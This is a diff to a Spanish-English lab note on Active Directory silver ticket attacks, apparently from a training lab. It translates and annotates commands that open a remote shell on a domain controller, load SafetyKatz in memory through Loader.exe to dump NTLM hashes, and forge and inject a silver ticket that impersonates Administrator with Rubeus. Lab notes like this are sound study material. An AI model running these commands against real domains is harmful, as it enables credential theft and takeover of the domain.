@@ -3,20 +3,24 @@
 Tags: #AD #Windows #Powershell #Rubeus 
 
 ```bash  
-# If you have access to machine account credential, you can forward silver tickets 
+# Si tienes acceso a las credenciales de una cuenta de máquina, puedes reenviar (forward) silver tickets
 
-- A valid Service Ticket or TGS ticket (Golden ticket is TGT).
-- Encrypted and Signed by the hash of the service account (Golden ticket is signed by hash of krbtgt) of the service running with that account.
-- Services rarely check PAC (Privileged Attribute Certificate).
-- Services will allow access only to the services themselves.
-- Reasonable persistence period (default 30 days for computer accounts).
+- Un ticket de servicio válido o ticket TGS (el Golden Ticket es un TGT).
+- Cifrado y firmado con el hash de la cuenta de servicio (el Golden Ticket está firmado con el hash de krbtgt) del servicio que se ejecuta con esa cuenta.
+- Los servicios rara vez validan el PAC (Privileged Attribute Certificate).
+- Los servicios permitirán acceso únicamente a sí mismos.
+- Periodo de persistencia razonable (por defecto 30 días para cuentas de equipo).
 ```
 
 ```powershell 
 # Extracción 
-❯ winrs -r:dcorp-dc cmd   # Conectarse al DC con svcadmin
+! Usuario: Domain Admin o cuenta con acceso administrativo al DC
 
-❯ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit" # Descargar y ejecutar Safetikatz en memoria para obtener el hash ntlm del usuario krbtgt
+❯ winrs -r:dcorp-dc cmd
+# Abrir una shell remota en el DC vía WinRM usando las credenciales actuales.
+
+❯ .\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"
+# Cargar SafetyKatz en memoria vía portforwarding y vuelca hashes NTLM desde el DC — los hashes NTLM que muestra corresponden a los rc4 que se usan en Rubeus.
 
 Nota
 	- Cuando muestra los NTLM en esta ocasión son los rc4 que colocamos en el rubeus
@@ -25,12 +29,16 @@ Nota
 ## Rubeus 
 
 ```powershell 
-❯ C:\AD\Rubeus.exe silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:6e58e06e07588123319fe02feeab775d /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
+! Usuario: Domain Admin (requiere hash NTLM del servicio objetivo y SID del dominio)
 
-# Con loader
-❯ C:\AD\Loader.exe -path C:\AD\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:6e58e06e07588123319fe02feeab775d /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt    # Inject the ticket in the current process 
+❯ .\Rubeus.exe silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:6e58e06e07588123319fe02feeab775d /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
+# Forjar e inyectar un Silver Ticket para el servicio HTTP del DC impersonando a Administrator — /ldap consulta al DC para obtener atributos del usuario. Aplicable también a HOST, RPCSS, CIFS y otros servicios.
 
-❯ C:\AD\Loader.exe -path C:\AD\Rubeus.exe -args klist    # Mirar los tickets 
+❯ .\Loader.exe -path C:\AD\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:6e58e06e07588123319fe02feeab775d /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
+# Cargar Rubeus en memoria vía Loader.exe y forjar el Silver Ticket en modo evasivo — inyecta el ticket directamente en el proceso actual.
+
+❯ .\Loader.exe -path C:\AD\Rubeus.exe -args klist
+# Listar los tickets Kerberos activos en la sesión actual para verificar que el Silver Ticket fue inyectado correctamente.
 
 
 Notes:
@@ -38,3 +46,5 @@ Notes:
 	2. Similar command can be used for any other service on a machine. Which services? HOST, RPCSS, CIFS and many more.
 ```
 
+
+![[Silver Attack 1.png]]
